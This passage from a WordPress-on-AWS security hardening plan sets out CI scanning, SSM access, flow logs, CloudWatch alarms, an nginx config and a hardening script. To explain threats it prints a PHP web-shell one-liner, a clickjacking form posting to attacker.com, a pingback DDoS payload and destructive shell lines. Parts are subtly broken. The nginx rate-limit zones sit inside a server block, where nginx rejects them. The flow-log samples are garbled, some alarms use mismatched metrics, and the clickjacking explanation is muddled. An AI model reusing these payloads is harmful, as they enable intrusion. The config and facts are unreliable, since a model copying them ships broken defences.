| Base OS | Alpine, Ubuntu, Debian CVEs | System-level exploits |
| Language runtime | PHP, Python, Node.js CVEs | RCE, code execution |
| Dependencies | Composer, npm, pip packages |供应链攻击 |
| Application | Custom code | Business logic flaws |
| Secrets | API keys in image | Credential exposure |

**Real Breach Example - SolarWinds (2020):**
While not container-specific, the SolarWinds attack demonstrated supply chain risks:
- Malicious code injected at build time
- Signed as legitimate update
- Dormant until triggered
- Affected 18,000+ customers

**Container Scanning in CI/CD Benefits:**

| Stage | What We Catch | Cost |
|-------|---------------|------|
| Build time | New vulnerabilities | Fix now = cheap |
| Pre-deploy | Known CVEs in image | Fix now = moderate |
| Runtime | Zero-days, config issues | Response = expensive |
| Post-deploy | Exploitable weaknesses | Remediation = costly |

**Trivy Capabilities:**

| Scan Type | What It Detects | Why It Matters |
|-----------|----------------|----------------|
| Vulnerability | Known CVEs in packages | Prevent RCE |
| Secret | API keys, passwords in image | Prevent breaches |
| Misconfiguration | Docker/K8s misconfigs | Prevent container escape |
| SBOM | Software bill of materials | Supply chain transparency |
| License | Prohibited licenses | Legal compliance |

**Attack Scenario - Unpatched Container:**

```
Day 0:     Base image released with CVE-2024-XXXX
Day 1:     Attacker discovers vulnerability
Day 7:     Exploit published on Exploit-DB
Day 14:    Your image still vulnerable (no scanning)
Day 21:    Compromised via known CVE
Day 28:    Data breach discovered
Day 35:    Breach reported to authorities
Day 42:    GDPR fine issued
```

**Automated Scanning in CI/CD:**

```yaml
# GitHub Actions - Block vulnerable images
- name: Scan image
  uses: aquasecurity/trivy-action
  with:
    severity: CRITICAL,HIGH
    exit-code: '1'  # FAIL pipeline on critical

# Result: Production never deploys vulnerable images
```

**Cost of NOT Scanning:**

| Scenario | Cost | Impact |
|----------|------|--------|
| Deploy vulnerable image | $0 | Unknown risk |
| Detect in staging | $100 | Quick fix |
| Detect in production | $10,000 | Emergency response |
| Exploited in production | $500,000+ | Breach, fines, reputation |

**Supply Chain Security:**

```
Attacker compromises → npm package → Your container → Production
                    ↓
         500+ downloads/hour
         Injected malicious code
         Automatic build pipeline
         No human review
```

**Trivy vs. ECR Native Scanning:**

| Feature | ECR Native | Trivy |
|---------|-------------|-------|
| CVEs | ✅ | ✅ |
| Secrets | ❌ | ✅ |
| Misconfigs | ❌ | ✅ |
| CI/CD integration | Basic | Advanced |
| SBOM generation | ✅ | ✅ |
| IDE integration | ❌ | ✅ |
| Custom policies | ❌ | ✅ |
| Free tier | ✅ | ✅ |

#### Solution

**File:** `.github/workflows/security-scan.yml`
```yaml
name: Security Scanning

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

env:
  REGION: us-east-1
  ECR_REPOSITORY: wordpress

jobs:
  # ============================================
  # Container Vulnerability Scan
  # ============================================
  vulnerability-scan:
    name: Container Vulnerability Scan
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_OIDC_ROLE_ARN }}
          aws-region: ${{ env.REGION }}

      - name: Login to Amazon ECR
        id: login-ecr
        uses: aws-actions/amazon-ecr-login@v2

      - name: Pull latest image for scanning
        run: |
          docker pull ${{ env.ECR_REPOSITORY }}:${{ github.sha }} || \
          docker pull ${{ env.ECR_REPOSITORY }}:latest

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: '${{ env.ECR_REPOSITORY }}:${{ github.sha }}'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'
          scanners: 'vuln,secret,misconfig'

      - name: Upload Trivy results to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'trivy-results.sarif'
          category: 'Trivy/Container'

  # ============================================
  # SAST - Static Application Security Testing
  # ============================================
  sast-scan:
    name: Static Analysis Security Testing
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Run Semgrep SAST
        uses: returntocorp/semgrep-action@v1
        with:
          config: >
            p/owasp-top-ten
            p/nodejs
            p/docker
          output: semgrep-results.sarif

      - name: Upload Semgrep results
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: semgrep-results.sarif
          category: 'Semgrep/SAST'

  # ============================================
  # Secret Scanning
  # ============================================
  secret-scan:
    name: Secret Scanning
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Run GitLeaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          GITLEAKS_AUTHORIZATION: ${{ secrets.GITHUB_TOKEN }}

  # ============================================
  # Dependency Scanning
  # ============================================
  dependency-scan:
    name: Dependency Vulnerability Scan
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Run npm audit
        run: |
          npm audit --audit-level=high || true

      - name: Dependency Review
        uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: critical

  # ============================================
  # Infrastructure Scanning
  # ============================================
  tfsec-scan:
    name: Terraform Security Scan
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Run tfsec
        uses: aquasecurity/tfsec-action@v1
        with:
          soft_fail: true
          format: sarif
          output: tfsec-results.sarif

      - name: Upload tfsec results
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'tfsec-results.sarif'
          category: 'tfsec/IaC'
```

---

### 2.3 SSH Access Restriction - SSM Only

#### Why This Is Critical

**The SSH Attack Landscape:**

| Attack Vector | Description | Your Risk |
|---------------|-------------|-----------|
| Brute force | Automated password guessing | HIGH |
| SSH key guessing | Weak key authentication | MEDIUM |
| Credential stuffing | Leaked credentials from breaches | CRITICAL |
| Zero-day exploits | Unknown SSH vulnerabilities | MEDIUM |
| Insider threats | Malicious employees | HIGH |
| Social engineering | Phishing for SSH credentials | MEDIUM |

**Statistics:**
- 12 million+ SSH servers exposed to internet (Shodan)
- Average SSH brute force attack: 1,000 attempts/hour
- Top attacked credentials: root, admin, user, ubuntu
- 60% of breaches involve compromised credentials

**Current Vulnerability - VPC CIDR Access:**
```hcl
# Current security group rule
ingress {
  from_port = 22
  to_port   = 22
  protocol  = "tcp"
  cidr_blocks = ["11.0.0.0/16"]  # ENTIRE VPC
}
```

**What This Means:**
- 65,536 possible IP addresses with SSH access
- Any compromised EC2 in VPC = potential pivot point
- No visibility into who accessed when
- No MFA requirement
- Credentials logged in plain text

**Attack Scenario - Lateral Movement:**

```
Internet Attacker
       |
       v
Compromised CI/CD Server (10.0.1.100)
       |
       | (Inside VPC - SSH allowed!)
       v
EC2 Admin Server (10.0.3.50) <--- Current exposure
       |
       | (WordPress admin)
       v
RDS Database (10.0.4.100)
       |
       | (Data exfiltration)
       v
User data, credentials, content
```

**Why SSM Session Manager is Better:**

| Feature | SSH | SSM Session Manager |
|---------|-----|---------------------|
| Port 22 exposure | Required | Not used |
| MFA support | Optional | ✅ Built-in |
| Session recording | Manual config | ✅ Native |
| Credential storage | SSH keys | AWS IAM |
| Access logging | Server logs | CloudWatch + S3 |
| Password attacks | Possible | Not applicable |
| Key management | Manual | AWS managed |
| Bastion host needed | Yes | No |
| Just-in-time access | Manual | ✅ AWS Privileged Access Manager |

**Compliance Benefits:**

| Standard | SSH Requirement | SSM Advantage |
|----------|-----------------|----------------|
| SOC 2 | CC6.2 - Unique IDs | ✅ IAM integration |
| PCI-DSS | 8.2 - Multi-factor | ✅ MFA required |
| HIPAA | 164.312(d) - Auth | ✅ AWS-managed auth |
| ISO 27001 | A.9 - Access control | ✅ Fine-grained IAM |

**Session Recording Benefits:**
```bash
# Every command recorded:
Timestamp | User | Instance | Command | Output
2024-01-15 10:23:45 | john@company.com | i-0abc123 | sudo su - | [session]
2024-01-15 10:24:01 | root | i-0abc123 | cat /etc/passwd | [file contents]
2024-01-15 10:24:15 | root | i-0abc123 | rm -rf /var/www | [destructive action]
```

**Incident Response:**
- Full audit trail of all access
- Replay any session for forensics
- Identify who did what, when
- Evidence for compliance audits

**VPC Endpoints - Why They Matter:**

Without VPC endpoints:
```
EC2 (private subnet) → AWS Services (via NAT + IGW)
                            ↑
                      Additional cost
                      Internet traversal
                      Latency
```

With VPC endpoints:
```
EC2 (private subnet) → AWS Services (via private link)
                            ↑
                      No NAT required
                      Lower cost
                      Lower latency
                      More secure
```

#### Solution

**File:** `terraform/modules/ssm/main.tf`
```hcl
variable "vpc_id" {
  description = "VPC ID"
  type        = string
}

variable "security_group_ids" {
  description = "Security group IDs for VPC endpoints"
  type        = list(string)
  default     = []
}

variable "subnet_ids" {
  description = "Subnet IDs for VPC endpoints"
  type        = list(string)
}

variable "environment" {
  description = "Environment name"
  type        = string
}

variable "tags" {
  description = "Tags to apply to resources"
  type        = map(string)
  default     = {}
}

variable "route_table_ids" {
  description = "Route table IDs for S3 gateway endpoint"
  type        = list(string)
}

# SSM VPC Endpoints
resource "aws_vpc_endpoint" "ssm" {
  vpc_id            = var.vpc_id
  service_name      = "com.amazonaws.us-east-1.ssm"
  vpc_endpoint_type = "Interface"
  
  security_group_ids = var.security_group_ids
  subnet_ids         = var.subnet_ids
  private_dns_enabled = true
  
  tags = merge(var.tags, {
    Name = "ssm-endpoint"
  })
}

resource "aws_vpc_endpoint" "ssm_messages" {
  vpc_id            = var.vpc_id
  service_name      = "com.amazonaws.us-east-1.ssmmessages"
  vpc_endpoint_type = "Interface"
  
  security_group_ids = var.security_group_ids
  subnet_ids         = var.subnet_ids
  private_dns_enabled = true
  
  tags = merge(var.tags, {
    Name = "ssm-messages-endpoint"
  })
}

resource "aws_vpc_endpoint" "ec2_messages" {
  vpc_id            = var.vpc_id
  service_name      = "com.amazonaws.us-east-1.ec2messages"
  vpc_endpoint_type = "Interface"
  
  security_group_ids = var.security_group_ids
  subnet_ids         = var.subnet_ids
  private_dns_enabled = true
  
  tags = merge(var.tags, {
    Name = "ec2-messages-endpoint"
  })
}

resource "aws_vpc_endpoint" "secrets_manager" {
  vpc_id            = var.vpc_id
  service_name      = "com.amazonaws.us-east-1.secretsmanager"
  vpc_endpoint_type = "Interface"
  
  security_group_ids = var.security_group_ids
  subnet_ids         = var.subnet_ids
  private_dns_enabled = true
  
  tags = merge(var.tags, {
    Name = "secrets-manager-endpoint"
  })
}

resource "aws_vpc_endpoint" "s3" {
  vpc_id       = var.vpc_id
  service_name = "com.amazonaws.us-east-1.s3"
  vpc_endpoint_type = "Gateway"
  
  route_table_ids = var.route_table_ids
  
  tags = merge(var.tags, {
    Name = "s3-endpoint"
  })
}

# CloudWatch Log Group for SSM Sessions
resource "aws_cloudwatch_log_group" "ssm_sessions" {
  name              = "/aws/ssm/${var.environment}/session-manager"
  retention_in_days = 90
  
  tags = var.tags
}

output "ssm_vpc_endpoint_ids" {
  description = "IDs of SSM VPC endpoints"
  value = [
    aws_vpc_endpoint.ssm.id,
    aws_vpc_endpoint.ssm_messages.id,
    aws_vpc_endpoint.ec2_messages.id
  ]
}
```

---

## Phase 3: Medium Priority (Week 3)

### 3.1 VPC Flow Logs + CloudWatch

#### Why This Matters

**Network Forensics:**
Without VPC Flow Logs, you have no visibility into network traffic:

| What You Can't See | Risk |
|-------------------|------|
| Who is connecting | Reconnaissance detection |
| Failed connection attempts | Attack patterns |
| Unusual traffic volumes | Data exfiltration |
| Port scanning activity | Discovery attacks |
| Internal lateral movement | Post-breach activity |

**Attack Detection Without Flow Logs:**

```python
# Impossible without logging:
if suspicious_traffic_pattern(source_ip, dest_port):
    alert_security_team()
    
# With Flow Logs:
# We have the data, just need to analyze it
```

**Compliance Requirements:**

| Standard | Requirement | Without Flow Logs |
|----------|-------------|-------------------|
| SOC 2 | CC7.2 - Monitoring | ❌ No evidence |
| PCI-DSS | 10.1 - Audit trails | ❌ Violation |
| HIPAA | 164.312(b) - Audit controls | ❌ Violation |
| ISO 27001 | A.12.4 - Event logging | ❌ Violation |

**Forensics Scenario:**

```
Incident: Database accessed from unauthorized IP

Without Flow Logs:
- No evidence of connection
- Unable to determine source
- Cannot identify timeline
- Investigation dead end

With Flow Logs:
- OK   10.0.1.50 10.0.4.100 3306 443 1000 1500
- ACCEPT 10.0.1.50 → RDS (legitimate)
- OK   203.0.113.50 10.0.4.100 3306 443 2000 2000  
- ACCEPT 203.0.113.50 → RDS (SUSPICIOUS!)

Investigation: External IP accessed database
Timeline: 03:42 UTC
Data accessed: User table (exfiltration)
```

**VPC Flow Log Fields:**
```
version account-id interface-id srcaddr dstaddr srcport dstport protocol packets bytes action log-status
```

**What You Can Detect:**

| Pattern | Example | Threat |
|---------|---------|--------|
| Port scan | Many ports, one IP | Reconnaissance |
| Brute force | Many 3306 to RDS | Database attack |
| Data exfil | Large outbound traffic | Breach |
| Lateral movement | Internal scanning | Compromised host |
| DDoS | Traffic spike | Outage |
| C2 communication | Unusual outbound | Malware |

#### Solution

**File:** `terraform/modules/vpc-flow-logs/main.tf`
```hcl
variable "vpc_id" {
  description = "VPC ID"
  type        = string
}

variable "environment" {
  description = "Environment name"
  type        = string
}

variable "tags" {
  description = "Tags to apply to resources"
  type        = map(string)
  default     = {}
}

resource "aws_cloudwatch_log_group" "vpc_flow_logs" {
  name              = "/aws/vpc/flow-logs/${var.environment}"
  retention_in_days = 30
  
  tags = merge(var.tags, {
    Name = "vpc-flow-logs-${var.environment}"
  })
}

resource "aws_flow_log" "vpc" {
  vpc_id                   = var.vpc_id
  traffic_type             = "ALL"
  log_destination_type      = "cloud-watch-logs"
  log_destination           = aws_cloudwatch_log_group.vpc_flow_logs.arn
  max_aggregation_interval = 60
  
  tags = var.tags
}
```

---

### 3.2 CloudWatch Security Alarms

#### Why This Matters

**The Detection Gap:**
You can have all the logging in the world, but without alarms, breaches go unnoticed:

| Scenario | Without Alarms | With Alarms |
|----------|----------------|-------------|
| Brute force attack | Logged, unnoticed | Immediate alert |
| Root account usage | Logged, unnoticed | Immediate alert |
| Data exfiltration | Logged, unnoticed | Immediate alert |
| WAF blocked attack | Logged, unnoticed | Alert + context |
| Unusual admin activity | Logged, unnoticed | Alert |

**Mean Time to Detect (MTTD):**

| Without Alarms | With Alarms |
|----------------|-------------|
| Weeks to months | Minutes to hours |
| Often discovered by customers | Proactive detection |
| Large blast radius | Containment early |

**Security Alarms Needed:**

| Alarm | What It Detects | Response Time |
|-------|----------------|---------------|
| Root account | Privileged misuse | Immediate |
| Unauthorized API | Attack attempts | Immediate |
| Console no MFA | Policy violation | Immediate |
| WAF blocked | Active attack | 5 minutes |
| SQL injection | Targeted attack | 5 minutes |
| XSS attempts | Targeted attack | 5 minutes |
| 5xx errors | Service issues | 15 minutes |
| ECS failures | Availability | 5 minutes |

**Cost of Delayed Detection:**

| Time to Detect | Breach Cost (IBM) | Example |
|----------------|-------------------|---------|
| < 200 days | $3.43M | Best case |
| 200-400 days | $4.95M | Average |
| > 400 days | $7.23M | Worst case |

#### Solution

**File:** `terraform/modules/monitoring/security-alarms.tf`
```hcl
variable "environment" {
  description = "Environment name"
  type        = string
}

variable "alarm_sns_topic_arn" {
  description = "SNS topic ARN for alarm notifications"
  type        = string
}

variable "tags" {
  description = "Tags to apply to resources"
  type        = map(string)
  default     = {}
}

variable "db_cluster_identifier" {
  description = "RDS cluster identifier"
  type        = string
}

variable "ecs_cluster_name" {
  description = "ECS cluster name"
  type        = string
}

variable "ecs_service_name" {
  description = "ECS service name"
  type        = string
}

variable "alb_name" {
  description = "ALB name"
  type        = string
}

variable "target_group_name" {
  description = "Target group name"
  type        = string
}

# Root Account Usage Alarm
resource "aws_cloudwatch_metric_alarm" "root_account_usage" {
  alarm_name          = "${var.environment}-root-account-usage"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 1
  metric_name         = "RootAccountUsage"
  namespace           = "CloudTrail"
  period              = 60
  statistic           = "Sum"
  threshold           = 0
  alarm_description   = "Alarm when Root account is used"
  
  alarm_actions = [var.alarm_sns_topic_arn]
  ok_actions    = [var.alarm_sns_topic_arn]
  
  tags = var.tags
}

# Unauthorized API Calls Alarm
resource "aws_cloudwatch_metric_alarm" "unauthorized_api" {
  alarm_name          = "${var.environment}-unauthorized-api-calls"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 1
  metric_name         = "Non-authorized information calls"
  namespace           = "CloudTrail"
  period              = 300
  statistic           = "Sum"
  threshold           = 1
  alarm_description   = "Alarm for unauthorized API calls"
  
  alarm_actions = [var.alarm_sns_topic_arn]
  ok_actions    = [var.alarm_sns_topic_arn]
  
  tags = var.tags
}

# Console Login Without MFA Alarm
resource "aws_cloudwatch_metric_alarm" "console_no_mfa" {
  alarm_name          = "${var.environment}-console-login-without-mfa"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 1
  metric_name         = "ConsoleLoginWithoutMfa"
  namespace           = "CloudTrail"
  period              = 60
  statistic           = "Sum"
  threshold           = 0
  alarm_description   = "Alarm when console login without MFA"
  
  alarm_actions = [var.alarm_sns_topic_arn]
  ok_actions    = [var.alarm_sns_topic_arn]
  
  tags = var.tags
}

# WAF Blocked Requests Alarm
resource "aws_cloudwatch_metric_alarm" "waf_blocked_requests" {
  alarm_name          = "${var.environment}-waf-blocked-requests"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 1
  metric_name         = "BlockedRequests"
  namespace           = "AWS/WAFV2"
  period              = 300
  statistic           = "Sum"
  threshold           = 100
  alarm_description   = "Alarm when WAF blocks significant traffic"
  
  alarm_actions = [var.alarm_sns_topic_arn]
  ok_actions    = [var.alarm_sns_topic_arn]
  
  tags = var.tags
}

# WAF SQL Injection Alarm
resource "aws_cloudwatch_metric_alarm" "waf_sql_injection" {
  alarm_name          = "${var.environment}-waf-sql-injection"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 1
  metric_name         = "BlockedRequests"
  namespace           = "AWS/WAFV2"
  period              = 300
  statistic           = "Sum"
  threshold           = 10
  alarm_description   = "Alarm for SQL injection attempts"
  
  alarm_actions = [var.alarm_sns_topic_arn]
  ok_actions    = [var.alarm_sns_topic_arn]
  
  tags = var.tags
}

# WAF XSS Attack Alarm
resource "aws_cloudwatch_metric_alarm" "waf_xss_attacks" {
  alarm_name          = "${var.environment}-waf-xss-attacks"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 1
  metric_name         = "BlockedRequests"
  namespace           = "AWS/WAFV2"
  period              = 300
  statistic           = "Sum"
  threshold           = 10
  alarm_description   = "Alarm for XSS attack attempts"
  
  alarm_actions = [var.alarm_sns_topic_arn]
  ok_actions    = [var.alarm_sns_topic_arn]
  
  tags = var.tags
}

# ALB 5xx Errors Alarm
resource "aws_cloudwatch_metric_alarm" "alb_5xx_errors" {
  alarm_name          = "${var.environment}-alb-5xx-errors"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 2
  metric_name         = "HTTPCode_Target_5XX_Count"
  namespace           = "AWS/ApplicationELB"
  period              = 300
  statistic           = "Sum"
  threshold           = 100
  alarm_description   = "ALB 5xx error count high"
  
  alarm_actions = [var.alarm_sns_topic_arn]
  ok_actions    = [var.alarm_sns_topic_arn]
  
  tags = var.tags
}

# ECS Deployment Failures Alarm
resource "aws_cloudwatch_metric_alarm" "ecs_deployment_failures" {
  alarm_name          = "${var.environment}-ecs-deployment-failures"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 1
  metric_name         = "RunningTasks"
  namespace           = "AWS/ECS"
  period              = 60
  statistic           = "Minimum"
  threshold           = 1
  alarm_description   = "ECS running tasks dropped below minimum"
  
  alarm_actions = [var.alarm_sns_topic_arn]
  ok_actions    = [var.alarm_sns_topic_arn]
  
  tags = var.tags
}
```

---

## Phase 4: Additional Hardening (Week 4)

### 4.1 Enhanced Nginx Configuration

#### Why Each Security Header Matters

**Security Headers Breakdown:**

| Header | Protection | Attack Prevented |
|--------|------------|------------------|
| X-Frame-Options | Clickjacking | User performs unintended actions |
| X-Content-Type-Options | MIME sniffing | Browser executes disguised files |
| X-XSS-Protection | XSS filtering | Legacy browser XSS attacks |
| Referrer-Policy | Referrer leakage | Information disclosure |
| Strict-Transport-Security | HTTP downgrade | SSL strip attacks |
| Permissions-Policy | Feature access | Browser feature abuse |

**X-Frame-Options - Clickjacking:**
```html
<!-- Attacker embeds your site in iframe -->
<iframe src="https://yourwordpress.com/wp-admin/">
  <form action="https://attacker.com/steal">
    <input name="wp-submit">
  </form>
</iframe>

<!-- User thinks they're clicking your button -->
<!-- Actually submits to attacker -->
```

**X-Content-Type-Options - MIME Sniffing:**
```
Attacker uploads: malicious.jpg (contains JavaScript)
Content-Type: image/jpeg

Browser sees: text/html (MIME sniffing)
Browser executes: JavaScript!

Header prevents this by forcing correct type interpretation
```

**Strict-Transport-Security - SSL Stripping:**
```
Without HSTS:
User types: yoursite.com
Browser connects: http://yoursite.com (no redirect)
Attacker intercepts: http://yoursite.com
Attacker forwards: https://yoursite.com (malicious copy)

With HSTS:
Browser remembers: yoursite.com requires HTTPS
Browser connects: https://yoursite.com
Attack prevented: Browser won't connect to http://
```

**Rate Limiting - Why It Matters:**
- Prevents brute force attacks
- Mitigates DDoS attacks
- Protects against credential stuffing
- Limits scraper impact

**PHP in Uploads - Critical Risk:**
WordPress uploads are a common attack vector:
```
# Malicious file upload
uploaded-shell.php.jpg
Content-Type: image/jpeg
<?php system($_GET['cmd']); ?>

# If PHP executes:
# Remote code execution
# Full server compromise
# Backdoor installed
```

#### Solution

**File:** `docker/wordpress-fpm/nginx.conf`
```nginx
server {
    listen 80;
    listen [::]:80;
    server_name _;
    
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    
    server_name _;
    
    # SSL Configuration
    ssl_certificate     /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    ssl_session_cache   shared:SSL:10m;
    ssl_session_timeout 1d;
    ssl_stapling        on;
    ssl_stapling_verify on;
    
    # Security Headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    # Hide nginx version
    server_tokens off;
    
    # Rate Limiting Zones
    limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
    limit_conn_zone $binary_remote_addr zone=addr:10m;
    
    root /var/www/html;
    index index.php index.html;
    
    location / {
        limit_req zone=general burst=20 nodelay;
        limit_conn addr 10;
        try_files $uri $uri/ /index.php?$args;
    }
    
    location = /wp-login.php {
        limit_req zone=login burst=3 nodelay;
        
        include fastcgi_params;
        fastcgi_pass unix:/var/run/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
    
    location /wp-admin/ {
        limit_req zone=login burst=5 nodelay;
        try_files $uri $uri/ /index.php?$args;
    }
    
    location ~ \.php$ {
        include fastcgi_params;
        fastcgi_pass unix:/var/run/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        fastcgi_param PATH_INFO $fastcgi_path_info;
        fastcgi_index index.php;
    }
    
    # Block XML-RPC
    location = /xmlrpc.php {
        deny all;
        access_log off;
    }
    
    # Disable PHP in uploads
    location /wp-content/uploads/ {
        location ~ \.php$ {
            deny all;
        }
    }
    
    # Block wp-config.php
    location = /wp-config.php {
        deny all;
    }
    
    location ~ /\. {
        deny all;
    }
    
    # Static files caching
    location ~* \.(jpg|jpeg|gif|png|webp|svg|ico|css|js|woff|woff2|ttf|eot)$ {
        expires 30d;
        add_header Cache-Control "public, immutable";
        access_log off;
    }
    
    gzip on;
    gzip_vary on;
    client_max_body_size 10M;
}
```

---

### 4.2 WordPress Security Hardening Script

#### Why Each Hardening Step Matters

**File Permissions:**

| Permission | File Type | Risk Without | Why |
|------------|-----------|--------------|-----|
| 644 | Files | World-writable | Anyone can modify |
| 755 | Directories | Traversal risk | Directory listing |
| 400 | wp-config.php | Credential theft | Config exposure |

**DISALLOW_FILE_EDIT:**
WordPress admin has a built-in file editor:
- Plugins → Plugin Editor
- Appearance → Theme Editor

Attackers with admin access can:
1. Inject malicious code
2. Create backdoors
3. Modify core files

This setting prevents:
- Accidental damage by admins
- Exploitation via compromised admin account
- Easy malware injection

**PHP in Uploads:**
WordPress media library allows uploads to `/wp-content/uploads/`

Without protection:
```bash
# Attacker uploads
evil.php.jpg

# Accesses directly
your-site.com/wp-content/uploads/2024/01/evil.php.jpg

# Executes PHP
# Remote shell installed
# Full compromise
```

With `.htaccess` protection:
```
<FilesMatch "\.php$">
    Deny from all
</FilesMatch>

# Browser gets: 403 Forbidden
# PHP never executes
```

**Author Enumeration:**
WordPress exposes user IDs via URL:
```
/?author=1
/?author=2
/?author=3
```

Attackers can:
1. Enumerate all admin accounts
2. Target specific users
3. Build credential wordlists
4. Launch targeted attacks

Block rule:
```apache
RewriteCond %{QUERY_STRING} ^author=([0-9]+)
RewriteRule .* - [F]
```

**XML-RPC Risks:**
WordPress XML-RPC is an API endpoint that:
- Allows remote posting
- Enables pingbacks
- Supports mobile apps

Attackers abuse it for:
1. **Brute force** (fast, 100+ req/sec)
2. **DDoS amplification** (pingback)
3. **Internal scanning** (SSRF)

```xml
<!-- Pingback DDoS -->
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value>http://victim.com</value></param>
    <param><value>http://attacker.com</value></param>
  </params>
</methodCall>
```

**REST API Exposure:**
WordPress REST API exposes data:
```
/wp-json/wp/v2/users
/wp-json/wp/v2/posts
/wp-json/wp/v2/settings
```

Attackers can:
1. Enumerate users
2. Extract content
3. Modify settings
4. Identify WordPress version

Restrict to authenticated users:
```php
add_filter('rest_authentication_errors', function($result) {
    if (!is_user_logged_in() && !is_admin()) {
        return new WP_Error('rest_disabled', 'REST API disabled');
    }
    return $result;
});
```

#### Solution

**File:** `scripts/wordpress-hardening.sh`
```bash
#!/bin/bash
# WordPress Security Hardening Script

set -e

WP_CONTENT_DIR="/var/www/html/wp-content"
WP_CONFIG="/var/www/html/wp-config.php"

echo "Starting WordPress security hardening..."

# 1. Secure File Permissions
echo "Setting secure file permissions..."
find /var/www/html -type d -exec chmod 755 {} \;
find /var/www/html -type f -exec chmod 644 {} \;
chmod 400 /var/www/html/wp-config.php

# 2. Disable File Editing
echo "Disabling file editing..."
if grep -q "DISALLOW_FILE_EDIT" "$WP_CONFIG"; then
    sed -i "s/define( 'DISALLOW_FILE_EDIT', false )/define( 'DISALLOW_FILE_EDIT', true )/" "$WP_CONFIG"
else
    echo "define( 'DISALLOW_FILE_EDIT', true );" >> "$WP_CONFIG"
fi

# 3. Disable PHP Execution in Uploads
echo "Disabling PHP execution in uploads..."
cat > "$WP_CONTENT_DIR/uploads/.htaccess" << 'HTACCESS'
<FilesMatch "\.php$">
    Order Deny,Allow
    Deny from all
</FilesMatch>
Options -ExecCGI
HTACCESS

# 4. Block Author Scans
echo "Blocking author enumeration..."
cat >> /var/www/html/.htaccess << 'HTACCESS'
<IfModule mod_rewrite.c>
    RewriteCond %{QUERY_STRING} ^author=([0-9]+)
    RewriteRule .* - [F,L]
</IfModule>
HTACCESS

# 5. Disable XML-RPC
echo "Disabling XML-RPC..."
if [ -f "/var/www/html/xmlrpc.php" ]; then
    mv /var/www/html/xmlrpc.php /var/www/html/xmlrpc.php.disabled
fi

# 6. Add Security Config to wp-config.php
echo "Adding security configuration to wp-config.php..."
cat >> "$WP_CONFIG" << 'WPConfig'

// Disable XML-RPC
add_filter('xmlrpc_enabled', '__return_false');

// Remove WordPress version from head
remove_action('wp_head', 'wp_generator');

// Disable REST API for non-authenticated users
add_filter('rest_authentication_errors', function($result) {
    if (!is_user_logged_in() && !is_admin()) {
        return new WP_Error('rest_disabled', 'REST API is disabled.', array('status' => 403));
    }
    return $result;
});
WPConfig

echo "WordPress security hardening completed!"
```

---

## Implementation Order Checklist

### Week 1: Critical Fixes
- [ ] Create `terraform/modules/secrets/main.tf`
- [ ] Create `terraform/modules/secrets/variables.tf`
- [ ] Update `terraform/modules/ec2-admin/user-data.sh`
- [ ] Create `terraform/backend.tf`
- [ ] Create `terraform/modules/backend/main.tf`
- [ ] Create `terraform/modules/acm/main.tf`
- [ ] Create `terraform/modules/alb-security/main.tf`
- [ ] Update ALB to add HTTPS listener

### Week 2: High Priority
- [ ] Create `terraform/modules/waf/main.tf`
- [ ] Create `.github/workflows/security-scan.yml`
- [ ] Update `.github/workflows/wordpress-ci-cd.yml` with security scanning
- [ ] Create `terraform/modules/ssm/main.tf`
- [ ] Remove SSH rule from security groups

### Week 3: Medium Priority
- [ ] Create `terraform/modules/vpc-flow-logs/main.tf`
- [ ] Create `terraform/modules/monitoring/security-alarms.tf`
- [ ] Enable VPC Flow Logs
- [ ] Deploy CloudWatch security alarms

### Week 4: Hardening
- [ ] Update `docker/wordpress-fpm/nginx.conf`
- [ ] Create `scripts/wordpress-hardening.sh`
- [ ] Run WordPress hardening script
- [ ] Document incident response procedures

---

## Estimated Timeline

| Phase | Tasks | Duration | Effort |
|-------|-------|----------|--------|
